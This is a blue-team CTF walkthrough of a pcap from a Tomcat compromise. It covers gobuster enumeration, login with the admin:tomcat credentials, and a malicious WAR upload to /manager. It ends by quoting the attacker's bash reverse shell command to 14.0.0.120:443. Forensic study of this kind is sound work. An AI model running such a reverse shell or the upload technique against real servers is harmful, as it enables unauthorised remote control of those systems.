# Tomcat Takeover

##### Q1:
By looking in the pcap at the Statistics menu at **Conversations** we can see that the same ip address made a lot of requests to another ip address on different ports. We can asume that that is our attacker and it is enumerating ports.

flag q1: `14.0.0.120`

##### Q2:
By putting the ip in https://whatismyipaddress.com/ I got that the ip was from china.

flag q2: `China`

##### Q3:
By searching for `admin` in packet bytes the first request had the port 8080.

flag q3: `8080`

##### Q4:
By looking at the 404 requests from the server to the attacker (since we know he was enumarating processes and some will give 404 if they were in the wordlist but were not found) we can see that one of them had this line in it:
```h
noshade="noshade"><h3>Apache Tomcat/7.0.88</h3></body></html>
GET /host-manager/host-manager.xml HTTP/1.1
Host: 10.0.0.112:8080
User-Agent: gobuster/3.6
Accept-Encoding: gzip
```
From here we can recognize the enumeration tool to be gobuster.

flag q4: `gobuster`

##### Q5:
By looking in the `Export Objects` menu for HTTP request at the requests made by the attacker we can see that he made a request to some endpoints one of them also being `/manager`. This looked suspicious to me so I tried it and it turned out to be the flag.

flag q5: `/manager`

##### Q6:
I filtered with `http.authbasic` for the http login requests and the last one had the username and password in `Authorization: Basic`

flag q6: `admin:tomcat`

##### Q7:
I found the next http stream after the last login attempt and and found this in the headers:
```
POST /manager/html/upload;jsessionid=0DE586F27B2F48D0CA045F731E0E9E71?org.apache.catalina.filters.CSRF_NONCE=83EDF4E2462ECC725BAF342DD7A46974 HTTP/1.1
Host: 10.0.0.112:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.0.0.112:8080/manager/html
Content-Type: multipart/form-data; boundary=---------------------------309854885940911807712888696060
Content-Length: 1324
Origin: http://10.0.0.112:8080
Authorization: Basic YWRtaW46dG9tY2F0
Connection: keep-alive
Cookie: JSESSIONID=0DE586F27B2F48D0CA045F731E0E9E71
Upgrade-Insecure-Requests: 1
``` 

flag q7: `JXQOZY.war`

##### Q8:
After searching in packet bytes for the string "/bin/sh" since we know the attacker has reverse shell I could find a packet that had a command that looked similar to a reverse shell command.

flag q8: `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`